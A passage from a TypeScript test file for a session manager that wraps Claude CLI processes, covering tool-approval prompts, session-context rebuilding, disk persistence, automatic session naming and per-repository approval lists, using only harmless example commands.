    })

    it('broadcasts prompt to clients and sets pendingToolApprovals', async () => {
      const s = sm.create('test', '/tmp')
      const ws = fakeWs()
      sm.join(s.id, ws)

      // Start the request but don't await it yet -- it returns a Promise
      const approvalPromise = sm.requestToolApproval(s.id, 'Bash', { command: 'echo hello' })

      // Pending tool approval should be set
      expect(s.pendingToolApprovals.size).toBe(1)
      const pending = s.pendingToolApprovals.values().next().value!
      expect(pending.toolName).toBe('Bash')

      // Client should have received prompt
      expect(ws.send).toHaveBeenCalled()
      const sentData = JSON.parse(ws.send.mock.calls[0][0])
      expect(sentData.type).toBe('prompt')
      expect(sentData.promptType).toBe('permission')
      expect(sentData.toolName).toBe('Bash')

      // Now resolve it
      pending.resolve({ allow: true, always: false })
      const result = await approvalPromise
      expect(result).toEqual({ allow: true, always: false })
    })

    it('broadcasts prompt with correct question for Bash tool', async () => {
      const s = sm.create('test', '/tmp')
      const ws = fakeWs()
      sm.join(s.id, ws)

      const promise = sm.requestToolApproval(s.id, 'Bash', { command: 'npm install' })
      s.pendingToolApprovals.values().next().value!.resolve({ allow: true, always: false })
      await promise

      const sentData = JSON.parse(ws.send.mock.calls[0][0])
      expect(sentData.question).toContain('Allow Bash?')
      expect(sentData.question).toContain('npm install')
    })
  })

  describe('summarizeToolPermission()', () => {
    // Access the private method via bracket notation for testing
    it('formats Bash commands correctly', () => {
      const s = sm.create('test', '/tmp')
      const ws = fakeWs()
      sm.join(s.id, ws)

      // Use requestToolApproval to indirectly test summarizeToolPermission
      sm.requestToolApproval(s.id, 'Bash', { command: 'ls -la' })
      s.pendingToolApprovals.values().next().value?.resolve({ allow: false, always: false })

      const sentData = JSON.parse(ws.send.mock.calls[0][0])
      expect(sentData.question).toBe('Allow Bash? `$ ls -la`')
    })

    it('truncates multiline Bash commands', () => {
      const s = sm.create('test', '/tmp')
      const ws = fakeWs()
      sm.join(s.id, ws)

      sm.requestToolApproval(s.id, 'Bash', { command: 'echo hello\necho world' })
      s.pendingToolApprovals.values().next().value?.resolve({ allow: false, always: false })

      const sentData = JSON.parse(ws.send.mock.calls[0][0])
      expect(sentData.question).toBe('Allow Bash? `$ echo hello...`')
    })

    it('formats Task tool correctly', () => {
      const s = sm.create('test', '/tmp')
      const ws = fakeWs()
      sm.join(s.id, ws)

      sm.requestToolApproval(s.id, 'Task', { description: 'Run the tests' })
      s.pendingToolApprovals.values().next().value?.resolve({ allow: false, always: false })

      const sentData = JSON.parse(ws.send.mock.calls[0][0])
      expect(sentData.question).toBe('Allow Task? Run the tests')
    })

    it('formats unknown tool with default message', () => {
      const s = sm.create('test', '/tmp')
      const ws = fakeWs()
      sm.join(s.id, ws)

      sm.requestToolApproval(s.id, 'CustomTool', { data: 'foo' })
      s.pendingToolApprovals.values().next().value?.resolve({ allow: false, always: false })

      const sentData = JSON.parse(ws.send.mock.calls[0][0])
      expect(sentData.question).toBe('Allow CustomTool?')
    })

    it('shows question prompt (not permission prompt) for AskUserQuestion', async () => {
      const s = sm.create('test', '/tmp')
      const ws = fakeWs()
      sm.join(s.id, ws)

      const toolInput = {
        questions: [
          { question: 'What naming convention?', header: 'Naming', options: [{ label: 'camelCase', description: 'e.g. myVar' }, { label: 'snake_case', description: 'e.g. my_var' }], multiSelect: false },
        ],
      }
      const promise = sm.requestToolApproval(s.id, 'AskUserQuestion', toolInput)

      // Should have a pending approval
      expect(s.pendingToolApprovals.size).toBe(1)

      // The prompt sent to the client should be a question, not a permission prompt
      const sentData = JSON.parse(ws.send.mock.calls[0][0])
      expect(sentData.type).toBe('prompt')
      expect(sentData.promptType).toBe('question')
      expect(sentData.question).toBe('What naming convention?')
      expect(sentData.options).toEqual([
        { label: 'camelCase', value: 'camelCase', description: 'e.g. myVar' },
        { label: 'snake_case', value: 'snake_case', description: 'e.g. my_var' },
      ])
      expect(sentData.questions).toHaveLength(1)

      // Simulate user answering the question
      const pending = s.pendingToolApprovals.values().next().value!
      pending.resolve({ allow: true, always: false, answer: 'camelCase' })

      const result = await promise
      expect(result.allow).toBe(true)
      expect(result.answer).toBe('camelCase')
    })

    it('resolves AskUserQuestion approval with answer text', async () => {
      const s = sm.create('test', '/tmp')
      const ws = fakeWs()
      sm.join(s.id, ws)

      const promise = sm.requestToolApproval(s.id, 'AskUserQuestion', { question: 'Pick a color' })

      // Send the answer via sendPromptResponse
      const requestId = s.pendingToolApprovals.keys().next().value!
      sm.sendPromptResponse(s.id, 'blue', requestId)

      const result = await promise
      expect(result.allow).toBe(true)
      expect(result.answer).toBe('blue')
    })
  })

  describe('buildSessionContext()', () => {
    // We can test buildSessionContext indirectly via sendInput when claude is not alive.
    // But we can also access the private method via bracket notation.
    function callBuildSessionContext(sm: SessionManager, sessionId: string): string | null {
      const session = sm.get(sessionId)
      if (!session) return null
      return (sm as any).buildSessionContext(session)
    }

    it('returns null for empty history', () => {
      const s = sm.create('test', '/tmp')
      const result = callBuildSessionContext(sm, s.id)
      expect(result).toBeNull()
    })

    it('includes user_echo messages', () => {
      const s = sm.create('test', '/tmp')
      sm.addToHistory(s, { type: 'user_echo', text: 'hello there' } as any)
      sm.addToHistory(s, { type: 'result' } as any)

      const result = callBuildSessionContext(sm, s.id)
      expect(result).toContain('User: hello there')
      expect(result).toContain('[This session was interrupted')
    })

    it('includes output as Assistant text', () => {
      const s = sm.create('test', '/tmp')
      sm.addToHistory(s, { type: 'output', data: 'Here is my response.' } as any)
      sm.addToHistory(s, { type: 'result' } as any)

      const result = callBuildSessionContext(sm, s.id)
      expect(result).toContain('Assistant: Here is my response.')
    })

    it('includes tool_active messages', () => {
      const s = sm.create('test', '/tmp')
      sm.addToHistory(s, { type: 'tool_active', toolName: 'Bash', toolInput: 'ls' } as any)

      const result = callBuildSessionContext(sm, s.id)
      expect(result).toContain('[Tool: Bash]')
    })

    it('includes tool_done with summary', () => {
      const s = sm.create('test', '/tmp')
      sm.addToHistory(s, { type: 'tool_done', toolName: 'Bash', summary: 'file1.txt\nfile2.txt' } as any)

      const result = callBuildSessionContext(sm, s.id)
      expect(result).toContain('[Tool result: file1.txt')
    })

    it('ignores tool_done with no summary', () => {
      const s = sm.create('test', '/tmp')
      sm.addToHistory(s, { type: 'tool_done', toolName: 'Bash' } as any)

      const result = callBuildSessionContext(sm, s.id)
      // Should return null since there are no meaningful lines
      expect(result).toBeNull()
    })

    it('truncates long assistant text to 500 chars', () => {
      const s = sm.create('test', '/tmp')
      const longText = 'A'.repeat(600)
      sm.addToHistory(s, { type: 'output', data: longText } as any)
      sm.addToHistory(s, { type: 'result' } as any)

      const result = callBuildSessionContext(sm, s.id)
      expect(result).toContain('...')
      // The assistant line should have been truncated
      const assistantLine = result!.split('\n').find(l => l.startsWith('Assistant:'))
      expect(assistantLine!.length).toBeLessThan(600)
    })

    it('truncates overall context to ~4000 chars by dropping earlier lines', () => {
      const s = sm.create('test', '/tmp')
      // Create many user messages to exceed 4000 chars
      for (let i = 0; i < 100; i++) {
        sm.addToHistory(s, { type: 'user_echo', text: `Message ${i}: ${'x'.repeat(50)}` } as any)
      }

      const result = callBuildSessionContext(sm, s.id)
      expect(result).not.toBeNull()
      // The context wrapper + content should be around 4000 chars or less (plus wrapper text)
      const contextBody = result!.replace('[This session was interrupted by a server restart. Here is the previous conversation for context:]\n', '')
        .replace('\n[End of previous context. The user\'s new message follows.]', '')
      expect(contextBody.length).toBeLessThanOrEqual(4500) // some overhead from wrapper
    })

    it('handles full conversation flow: user_echo, output, tool_active, tool_done, result', () => {
      const s = sm.create('test', '/tmp')
      sm.addToHistory(s, { type: 'user_echo', text: 'list files' } as any)
      sm.addToHistory(s, { type: 'output', data: 'Let me check.' } as any)
      sm.addToHistory(s, { type: 'tool_active', toolName: 'Bash', toolInput: 'ls' } as any)
      sm.addToHistory(s, { type: 'tool_done', toolName: 'Bash', summary: 'file1.txt file2.txt' } as any)
      sm.addToHistory(s, { type: 'result' } as any)
      sm.addToHistory(s, { type: 'user_echo', text: 'thanks' } as any)
      sm.addToHistory(s, { type: 'output', data: 'You are welcome.' } as any)
      sm.addToHistory(s, { type: 'result' } as any)

      const result = callBuildSessionContext(sm, s.id)
      expect(result).toContain('User: list files')
      // output "Let me check." is accumulated as assistantText and flushed at result
      expect(result).toContain('Assistant: Let me check.')
      expect(result).toContain('[Tool: Bash]')
      expect(result).toContain('[Tool result: file1.txt file2.txt]')
      expect(result).toContain('User: thanks')
      expect(result).toContain('Assistant: You are welcome.')
    })

    it('flushes remaining assistant text at end', () => {
      const s = sm.create('test', '/tmp')
      sm.addToHistory(s, { type: 'output', data: 'Some trailing text' } as any)
      // No result to flush

      const result = callBuildSessionContext(sm, s.id)
      expect(result).toContain('Assistant: Some trailing text')
    })

    it('returns null when all history entries produce no lines', () => {
      const s = sm.create('test', '/tmp')
      // result and tool_done without summary produce no lines on their own
      sm.addToHistory(s, { type: 'result' } as any)

      const result = callBuildSessionContext(sm, s.id)
      expect(result).toBeNull()
    })
  })

  describe('broadcast() high-water mark', () => {
    it('skips clients whose bufferedAmount exceeds 1MB', () => {
      const s = sm.create('test', '/tmp')
      const wsFull = fakeWs(true)
      wsFull.bufferedAmount = 2_000_000 // exceeds 1MB
      const wsNormal = fakeWs(true)

      sm.join(s.id, wsFull)
      sm.join(s.id, wsNormal)

      sm.broadcast(s, { type: 'pong' } as any)

      expect(wsFull.send).not.toHaveBeenCalled()
      expect(wsNormal.send).toHaveBeenCalledWith(JSON.stringify({ type: 'pong' }))
    })
  })

  describe('persistToDisk() and restoreFromDisk()', () => {
    it('persistToDisk writes session data via fs', () => {
      const mockedMkdirSync = vi.mocked(mkdirSync)
      const mockedWriteFileSync = vi.mocked(writeFileSync)
      const mockedRenameSync = vi.mocked(renameSync)

      const s = sm.create('test-persist', '/tmp/persist')
      sm.addToHistory(s, { type: 'output', data: 'hello' } as any)

      sm.persistToDisk()

      expect(mockedMkdirSync).toHaveBeenCalled()
      expect(mockedWriteFileSync).toHaveBeenCalled()
      expect(mockedRenameSync).toHaveBeenCalled()

      // Verify the data written
      const lastCall = mockedWriteFileSync.mock.calls[mockedWriteFileSync.mock.calls.length - 1]
      const writtenData = JSON.parse(lastCall[1] as string)
      const persisted = writtenData.find((p: any) => p.name === 'test-persist')
      expect(persisted).toBeDefined()
      expect(persisted.workingDir).toBe('/tmp/persist')
      expect(persisted.outputHistory.length).toBeGreaterThan(0)
    })

    it('persists repo approvals separately from sessions', () => {
      const mockedWriteFileSync = vi.mocked(writeFileSync);

      sm.approvalManager.addRepoApproval('/tmp/auto', { tool: 'Write' });
      sm.approvalManager.addRepoApproval('/tmp/auto', { tool: 'Edit' });
      sm.approvalManager.addRepoApproval('/tmp/auto', { command: 'npm test' });

      sm.approvalManager.persistRepoApprovals()

      // Find the call that wrote repo-approvals.json
      const approvalCall = mockedWriteFileSync.mock.calls.find(
        (c: any) => String(c[0]).includes('repo-approvals')
      )
      expect(approvalCall).toBeDefined()
      const writtenData = JSON.parse(approvalCall![1] as string)
      const entry = writtenData['/tmp/auto']
      expect(entry.tools).toContain('Write')
      expect(entry.tools).toContain('Edit')
      expect(entry.commands).toContain('npm test')
    })

    it('round-trips session data through persist and restore', () => {
      const mockedWriteFileSync = vi.mocked(writeFileSync)
      const mockedExistsSync = vi.mocked(existsSync)
      const mockedReadFileSync = vi.mocked(readFileSync)

      // Create a session with some data
      const s = sm.create('round-trip', '/tmp/roundtrip')
      sm.addToHistory(s, { type: 'user_echo', text: 'hello' } as any)
      sm.addToHistory(s, { type: 'output', data: 'world' } as any)

      sm.persistToDisk()

      // Capture what was written
      const lastCall = mockedWriteFileSync.mock.calls[mockedWriteFileSync.mock.calls.length - 1]
      const writtenJson = lastCall[1] as string

      // Now create a new SessionManager that restores from disk
      mockedExistsSync.mockImplementation((p) => String(p).includes('sessions.json') ? true : false)
      mockedReadFileSync.mockReturnValue(writtenJson)

      const sm2 = new SessionManager()
      const restored = sm2.get(s.id)

      expect(restored).toBeDefined()
      expect(restored!.name).toBe('round-trip')
      expect(restored!.workingDir).toBe('/tmp/roundtrip')
      expect(restored!.outputHistory).toHaveLength(2)
      // claudeSessionId is NOT restored (set to null)
      expect(restored!.claudeSessionId).toBeNull()
      // claudeProcess is not restored
      expect(restored!.claudeProcess).toBeNull()

      // Reset fs mocks for other tests
      mockedExistsSync.mockImplementation((p) => String(p).includes('sessions.json') ? false : true)
      mockedReadFileSync.mockReturnValue('[]')
    })
  })

  describe('shutdown()', () => {
    it('stops all alive claude processes', () => {
      const s1 = sm.create('a', '/tmp/a')
      const s2 = sm.create('b', '/tmp/b')
      const cp1 = fakeClaudeProcess(true)
      const cp2 = fakeClaudeProcess(false) // not alive
      s1.claudeProcess = cp1
      s2.claudeProcess = cp2

      sm.shutdown()

      expect(cp1.stop).toHaveBeenCalledOnce()
      // cp2 is not alive, so stop should not be called
      expect(cp2.stop).not.toHaveBeenCalled()
    })

    it('calls persistToDisk on shutdown', () => {
      const mockedWriteFileSync = vi.mocked(writeFileSync)
      sm.create('test', '/tmp')

      const callsBefore = mockedWriteFileSync.mock.calls.length
      sm.shutdown()
      // persistToDisk should have been called (writeFileSync invoked)
      expect(mockedWriteFileSync.mock.calls.length).toBeGreaterThan(callsBefore)
    })
  })

  describe('list() with active claude process', () => {
    it('reports active=true when claudeProcess is alive', () => {
      const s = sm.create('test', '/tmp')
      const cp = fakeClaudeProcess(true)
      s.claudeProcess = cp

      const list = sm.list()
      expect(list[0].active).toBe(true)
    })

    it('reports active=false when claudeProcess is not alive', () => {
      const s = sm.create('test', '/tmp')
      const cp = fakeClaudeProcess(false)
      s.claudeProcess = cp

      const list = sm.list()
      expect(list[0].active).toBe(false)
    })

    it('reports connectedClients count', () => {
      const s = sm.create('test', '/tmp')
      sm.join(s.id, fakeWs())
      sm.join(s.id, fakeWs())

      const list = sm.list()
      expect(list[0].connectedClients).toBe(2)
    })
  })

  describe('persistToDiskDebounced()', () => {
    beforeEach(() => {
      vi.useFakeTimers()
    })

    afterEach(() => {
      vi.useRealTimers()
    })

    it('debounces multiple persist calls into one', () => {
      const mockedWriteFileSync = vi.mocked(writeFileSync)
      const s = sm.create('test', '/tmp')

      // Record baseline call count before debounced writes
      void mockedWriteFileSync.mock.calls.length

      // addToHistory calls persistToDiskDebounced
      sm.addToHistory(s, { type: 'system_message', subtype: 'init', text: 'a' } as any)
      sm.addToHistory(s, { type: 'system_message', subtype: 'init', text: 'b' } as any)
      sm.addToHistory(s, { type: 'system_message', subtype: 'init', text: 'c' } as any)

      // No persist yet (debounced)
      const callsAfterImmediate = mockedWriteFileSync.mock.calls.length
      // The calls during create() already happened, but the debounced ones haven't
      // Advance past debounce time (2000ms)
      vi.advanceTimersByTime(2500)

      // Should have persisted exactly once more from the debounced call
      expect(mockedWriteFileSync.mock.calls.length).toBe(callsAfterImmediate + 1)
    })
  })

  describe('edge cases', () => {
    it('leave does not throw when session has no pending requests', () => {
      const s = sm.create('test', '/tmp')
      const ws = fakeWs()
      sm.join(s.id, ws)
      // No pending control requests
      sm.leave(s.id, ws)
      expect(s.clients.size).toBe(0)
    })

    it('delete clears all clients', () => {
      const s = sm.create('test', '/tmp')
      sm.join(s.id, fakeWs())
      sm.join(s.id, fakeWs())
      expect(s.clients.size).toBe(2)

      sm.delete(s.id)
      // Session is gone from the map
      expect(sm.get(s.id)).toBeUndefined()
    })

    it('sendPromptResponse with always_allow array for Bash stores command', () => {
      const s = sm.create('test', '/tmp')
      const cp = fakeClaudeProcess(true)
      s.claudeProcess = cp

      s.pendingControlRequests.set('req-1', {
        requestId: 'req-1',
        toolName: 'Bash',
        toolInput: { command: 'git status' },
      })

      sm.sendPromptResponse(s.id, ['always_allow'], 'req-1')

      // Pattern-first: 'git status' is patternable, stored as pattern
      expect(sm.approvalManager.getApprovals(s.workingDir).patterns).toContain('git status *')
      expect(cp.sendControlResponse).toHaveBeenCalledWith('req-1', 'allow')
    })

  })

  describe('rename()', () => {
    it('renames an existing session and returns true', () => {
      const s = sm.create('hub:abc123', '/tmp')
      const result = sm.rename(s.id, 'My New Name')
      expect(result).toBe(true)
      expect(s.name).toBe('My New Name')
    })

    it('returns false for non-existent session', () => {
      expect(sm.rename('no-such-id', 'test')).toBe(false)
    })

    it('broadcasts session_name_update to connected clients', () => {
      const s = sm.create('hub:abc', '/tmp')
      const ws = fakeWs()
      sm.join(s.id, ws)

      sm.rename(s.id, 'Updated Name')

      expect(ws.send).toHaveBeenCalled()
      const sent = JSON.parse(ws.send.mock.calls[0][0])
      expect(sent.type).toBe('session_name_update')
      expect(sent.name).toBe('Updated Name')
      expect(sent.sessionId).toBe(s.id)
    })

    it('calls persistToDiskDebounced', () => {
      vi.useFakeTimers()
      const mockedWriteFileSync = vi.mocked(writeFileSync)
      const s = sm.create('hub:abc', '/tmp')
      const callsBefore = mockedWriteFileSync.mock.calls.length

      sm.rename(s.id, 'New Name')

      // Debounced — advance timer
      vi.advanceTimersByTime(3000)
      expect(mockedWriteFileSync.mock.calls.length).toBeGreaterThan(callsBefore)
      vi.useRealTimers()
    })
  })

  describe('scheduleSessionNaming()', () => {
    beforeEach(() => {
      mockSpawn.mockReset()
    })

    it('schedules a naming timer for hub: sessions', () => {
      vi.useFakeTimers()
      const s = sm.create('hub:test123', '/tmp')
      s._lastUserInput = 'fix the login bug'
      s.outputHistory.push({ type: 'output', data: 'I will fix the login bug for you.' })

      sm.scheduleSessionNaming(s.id)

      expect(s._namingTimer).toBeDefined()
      vi.useRealTimers()
    })

    it('skips naming if name does not start with hub:', () => {
      const s = sm.create('Custom Name', '/tmp')

      sm.scheduleSessionNaming(s.id)

      expect(s._namingTimer).toBeUndefined()
    })

    it('skips naming for non-existent session', () => {
      sm.scheduleSessionNaming('nonexistent-id')
    })

    it('calls CLI after initial delay', async () => {
      vi.useFakeTimers()
      mockCliNaming('Dark Mode Support')
      const s = sm.create('hub:abc', '/tmp')
      s._lastUserInput = 'add dark mode support'
      s.outputHistory.push({ type: 'output', data: 'I will add dark mode.' })

      sm.scheduleSessionNaming(s.id)

      expect(mockSpawn).not.toHaveBeenCalled()

      await vi.advanceTimersByTimeAsync(20_000)
      await flushMicrotasks()

      expect(mockSpawn).toHaveBeenCalledOnce()
      vi.useRealTimers()
    })

    it('applies name from CLI response', async () => {
      vi.useFakeTimers()
      mockCliNaming('Fix Login Bug')
      const s = sm.create('hub:abc', '/tmp')
      s._lastUserInput = 'fix login'
      s.outputHistory.push({ type: 'output', data: 'Fixing login.' })

      sm.scheduleSessionNaming(s.id)
      await vi.advanceTimersByTimeAsync(20_000)
      await flushMicrotasks()

      expect(s.name).toBe('Fix Login Bug')
      vi.useRealTimers()
    })

    it('strips quotes and prefixes from CLI response', async () => {
      vi.useFakeTimers()
      mockCliNaming('"Session Name: Fix Login Bug"')
      const s = sm.create('hub:abc', '/tmp')
      s._lastUserInput = 'fix login'
      s.outputHistory.push({ type: 'output', data: 'Fixing.' })

      sm.scheduleSessionNaming(s.id)
      await vi.advanceTimersByTimeAsync(20_000)
      await flushMicrotasks()

      expect(s.name).toBe('Fix Login Bug')
      vi.useRealTimers()
    })

    it('keeps hub: name if CLI returns too-short name and schedules retry', async () => {
      vi.useFakeTimers()
      mockCliNaming('X')
      const s = sm.create('hub:abc', '/tmp')
      s._lastUserInput = 'x'
      s.outputHistory.push({ type: 'output', data: 'Done.' })

      sm.scheduleSessionNaming(s.id)
      await vi.advanceTimersByTimeAsync(20_000)
      await flushMicrotasks()

      expect(s.name).toBe('hub:abc')
      expect(s._namingAttempts).toBe(1)
      expect(s._namingTimer).toBeDefined()
      vi.useRealTimers()
    })

    it('keeps hub: name if CLI returns single-word name and schedules retry', async () => {
      vi.useFakeTimers()
      mockCliNaming('Debugging')
      const s = sm.create('hub:abc', '/tmp')
      s._lastUserInput = 'fix the bug'
      s.outputHistory.push({ type: 'output', data: 'Done.' })

      sm.scheduleSessionNaming(s.id)
      await vi.advanceTimersByTimeAsync(20_000)
      await flushMicrotasks()

      expect(s.name).toBe('hub:abc')
      expect(s._namingAttempts).toBe(1)
      expect(s._namingTimer).toBeDefined()
      vi.useRealTimers()
    })

    it('keeps hub: name if CLI errors and schedules retry', async () => {
      vi.useFakeTimers()
      mockCliNamingError()
      const s = sm.create('hub:abc', '/tmp')
      s._lastUserInput = 'fix login'
      s.outputHistory.push({ type: 'output', data: 'Fixing.' })

      sm.scheduleSessionNaming(s.id)
      await vi.advanceTimersByTimeAsync(20_000)
      await flushMicrotasks()

      expect(s.name).toBe('hub:abc')
      expect(s._namingAttempts).toBe(1)
      expect(s._namingTimer).toBeDefined()
      vi.useRealTimers()
    })

    it('retries with increasing delays up to max attempts', async () => {
      vi.useFakeTimers()
      mockCliNamingError()
      const s = sm.create('hub:abc', '/tmp')
      s._lastUserInput = 'fix login'
      s.outputHistory.push({ type: 'output', data: 'Fixing.' })

      sm.scheduleSessionNaming(s.id)

      const delays = [20_000, 60_000, 120_000, 240_000, 240_000]
      for (let i = 0; i < delays.length; i++) {
        await vi.advanceTimersByTimeAsync(delays[i])
        await flushMicrotasks()
        expect(s._namingAttempts).toBe(i + 1)
      }

      expect(s._namingTimer).toBeUndefined()
      expect(s._namingAttempts).toBe(5)
      vi.useRealTimers()
    })

    it('does not schedule duplicate timer if one is already pending', () => {
      vi.useFakeTimers()
      const s = sm.create('hub:abc', '/tmp')
      s._lastUserInput = 'fix login'
      s.outputHistory.push({ type: 'output', data: 'Fixing.' })

      sm.scheduleSessionNaming(s.id)
      const firstTimer = s._namingTimer

      sm.scheduleSessionNaming(s.id)
      expect(s._namingTimer).toBe(firstTimer)
      vi.useRealTimers()
    })

    it('does not rename if session was manually renamed before timer fires', async () => {
      vi.useFakeTimers()
      mockCliNaming('Auto Name Three Words')
      const s = sm.create('hub:abc', '/tmp')
      s._lastUserInput = 'fix login'
      s.outputHistory.push({ type: 'output', data: 'Fixing.' })

      sm.scheduleSessionNaming(s.id)
      sm.rename(s.id, 'Manual Name')

      await vi.advanceTimersByTimeAsync(20_000)
      await flushMicrotasks()

      expect(s.name).toBe('Manual Name')
      vi.useRealTimers()
    })

    it('clears naming timer on session delete', async () => {
      vi.useFakeTimers()
      mockCliNaming('Some Session Name')
      const s = sm.create('hub:abc', '/tmp')
      s._lastUserInput = 'fix login'
      s.outputHistory.push({ type: 'output', data: 'Fixing.' })

      sm.scheduleSessionNaming(s.id)
      expect(s._namingTimer).toBeDefined()

      sm.delete(s.id)

      await vi.advanceTimersByTimeAsync(20_000)
      await flushMicrotasks()
      expect(mockSpawn).not.toHaveBeenCalled()
      vi.useRealTimers()
    })
  })

  describe('retrySessionNamingOnInteraction()', () => {
    beforeEach(() => {
      mockSpawn.mockReset()
    })

    it('schedules naming with short delay for unnamed sessions', async () => {
      vi.useFakeTimers()
      mockCliNaming('Fix Login Bug')
      const s = sm.create('hub:abc', '/tmp')
      s._lastUserInput = 'fix login'
      s._namingAttempts = 1
      s.outputHistory.push({ type: 'output', data: 'Fixing.' })

      sm.retrySessionNamingOnInteraction(s.id)
      expect(s._namingTimer).toBeDefined()

      await vi.advanceTimersByTimeAsync(5_000)
      await flushMicrotasks()
      expect(mockSpawn).toHaveBeenCalled()
      expect(s.name).toBe('Fix Login Bug')
      vi.useRealTimers()
    })

    it('skips if naming timer already pending', () => {
      vi.useFakeTimers()
      const s = sm.create('hub:abc', '/tmp')
      s._lastUserInput = 'fix login'
      s.outputHistory.push({ type: 'output', data: 'Fixing.' })

      sm.scheduleSessionNaming(s.id)
      const originalTimer = s._namingTimer

      sm.retrySessionNamingOnInteraction(s.id)
      expect(s._namingTimer).toBe(originalTimer)
      vi.useRealTimers()
    })

    it('skips if max attempts reached', () => {
      vi.useFakeTimers()
      const s = sm.create('hub:abc', '/tmp')
      s._lastUserInput = 'fix login'
      s._namingAttempts = 5

      sm.retrySessionNamingOnInteraction(s.id)
      expect(s._namingTimer).toBeUndefined()
      vi.useRealTimers()
    })

    it('skips for non-hub: sessions', () => {
      vi.useFakeTimers()
      const s = sm.create('Custom Name', '/tmp')

      sm.retrySessionNamingOnInteraction(s.id)
      expect(s._namingTimer).toBeUndefined()
      vi.useRealTimers()
    })
  })

  describe('getApprovals()', () => {
    it('returns empty arrays for unknown workingDir', () => {
      const result = sm.approvalManager.getApprovals('/unknown/path')
      expect(result).toEqual({ tools: [], commands: [], patterns: [] })
    })

    it('returns sorted tools and commands', () => {
      // Use addRepoApproval (private) to set up approvals
      ;sm.approvalManager.addRepoApproval('/tmp/repo', { tool: 'Write' })
      ;sm.approvalManager.addRepoApproval('/tmp/repo', { tool: 'Edit' })
      ;sm.approvalManager.addRepoApproval('/tmp/repo', { tool: 'Bash' })
      ;sm.approvalManager.addRepoApproval('/tmp/repo', { command: 'npm test' })
      ;sm.approvalManager.addRepoApproval('/tmp/repo', { command: 'git status' })

      const result = sm.approvalManager.getApprovals('/tmp/repo')
      expect(result.tools).toEqual(['Bash', 'Edit', 'Write'])
      expect(result.commands).toEqual(['git status', 'npm test'])
    })
  })

  describe('removeApproval()', () => {
    it('returns invalid when no tool or command provided', () => {
      expect(sm.approvalManager.removeApproval('/tmp', {})).toBe('invalid')
    })

    it('returns invalid when tool and command are empty strings', () => {
      expect(sm.approvalManager.removeApproval('/tmp', { tool: '', command: '' })).toBe('invalid')
    })

    it('returns invalid when tool and command are whitespace', () => {
      expect(sm.approvalManager.removeApproval('/tmp', { tool: '  ', command: '  ' })).toBe('invalid')
    })

    it('returns false when no entry exists for workingDir', () => {
      expect(sm.approvalManager.removeApproval('/unknown', { tool: 'Write' })).toBe(false)
    })

    it('removes a tool and returns true', () => {
      ;sm.approvalManager.addRepoApproval('/tmp/repo', { tool: 'Write' })
      ;sm.approvalManager.addRepoApproval('/tmp/repo', { tool: 'Edit' })

      const result = sm.approvalManager.removeApproval('/tmp/repo', { tool: 'Write' })
      expect(result).toBe(true)

      const approvals = sm.approvalManager.getApprovals('/tmp/repo')
      expect(approvals.tools).not.toContain('Write')
      expect(approvals.tools).toContain('Edit')
    })

    it('removes a command and returns true', () => {
      ;sm.approvalManager.addRepoApproval('/tmp/repo', { command: 'npm test' })
      ;sm.approvalManager.addRepoApproval('/tmp/repo', { command: 'git status' })

      const result = sm.approvalManager.removeApproval('/tmp/repo', { command: 'npm test' })
      expect(result).toBe(true)

      const approvals = sm.approvalManager.getApprovals('/tmp/repo')
      expect(approvals.commands).not.toContain('npm test')
      expect(approvals.commands).toContain('git status')
    })

    it('returns false when tool does not exist in approvals', () => {
      ;sm.approvalManager.addRepoApproval('/tmp/repo', { tool: 'Write' })

      const result = sm.approvalManager.removeApproval('/tmp/repo', { tool: 'NonExistent' })
      expect(result).toBe(false)
    })

    it('persists to disk by default', () => {
      const mockedWriteFileSync = vi.mocked(writeFileSync)
      ;sm.approvalManager.addRepoApproval('/tmp/repo', { tool: 'Write' })

      // Flush any debounced persist from addRepoApproval
      vi.useFakeTimers()
      vi.advanceTimersByTime(3000)
      vi.useRealTimers()

      const callsBefore = mockedWriteFileSync.mock.calls.length
      sm.approvalManager.removeApproval('/tmp/repo', { tool: 'Write' })

      // persistRepoApprovals is called synchronously (not debounced) for removeApproval
      const callsAfter = mockedWriteFileSync.mock.calls.length
      expect(callsAfter).toBeGreaterThan(callsBefore)
    })

    it('skipPersist prevents persist call', () => {
      const mockedWriteFileSync = vi.mocked(writeFileSync)
      ;sm.approvalManager.addRepoApproval('/tmp/repo', { tool: 'Write' })

      // Flush debounced persist
      vi.useFakeTimers()
      vi.advanceTimersByTime(3000)
      vi.useRealTimers()

      const callsBefore = mockedWriteFileSync.mock.calls.length
      sm.approvalManager.removeApproval('/tmp/repo', { tool: 'Write' }, true)

      expect(mockedWriteFileSync.mock.calls.length).toBe(callsBefore)
    })
  })

  describe('completeInProgressTasks()', () => {
    it('marks in_progress tasks as completed during shutdown', () => {
      const s = sm.create('test', '/tmp')
      const cp = fakeClaudeProcess(true)
      s.claudeProcess = cp

      // Add a todo_update with in_progress tasks
      sm.addToHistory(s, {
        type: 'todo_update',
        tasks: [
          { id: '1', content: 'Task 1', status: 'completed' },
          { id: '2', content: 'Task 2', status: 'in_progress' },
          { id: '3', content: 'Task 3', status: 'pending' },
        ],
      } as any)

      const historyBefore = s.outputHistory.length

      sm.shutdown()

      // A new todo_update should have been appended
      expect(s.outputHistory.length).toBe(historyBefore + 1)
      const lastMsg = s.outputHistory[s.outputHistory.length - 1] as any
      expect(lastMsg.type).toBe('todo_update')
      // The in_progress task should be completed
      const task2 = lastMsg.tasks.find((t: any) => t.id === '2')
      expect(task2.status).toBe('completed')
      // Other tasks should remain unchanged
      const task1 = lastMsg.tasks.find((t: any) => t.id === '1')
      expect(task1.status).toBe('completed')
      const task3 = lastMsg.tasks.find((t: any) => t.id === '3')
      expect(task3.status).toBe('pending')
    })

    it('does not append todo_update if no in_progress tasks', () => {
      const s = sm.create('test', '/tmp')
      const cp = fakeClaudeProcess(true)
      s.claudeProcess = cp

      sm.addToHistory(s, {
        type: 'todo_update',
        tasks: [
          { id: '1', content: 'Task 1', status: 'completed' },
        ],
      } as any)

      const historyBefore = s.outputHistory.length

      sm.shutdown()

      // No extra todo_update appended
      expect(s.outputHistory.length).toBe(historyBefore)
    })

    it('skips sessions with inactive claude process', () => {
      const s = sm.create('test', '/tmp')
      const cp = fakeClaudeProcess(false) // not alive
      s.claudeProcess = cp

      sm.addToHistory(s, {
        type: 'todo_update',
        tasks: [
          { id: '1', content: 'Task 1', status: 'in_progress' },
        ],
      } as any)

      const historyBefore = s.outputHistory.length

      sm.shutdown()

      // completeInProgressTasks is only called for alive processes
      expect(s.outputHistory.length).toBe(historyBefore)
    })

    it('finds last todo_update when other messages follow', () => {
      const s = sm.create('test', '/tmp')
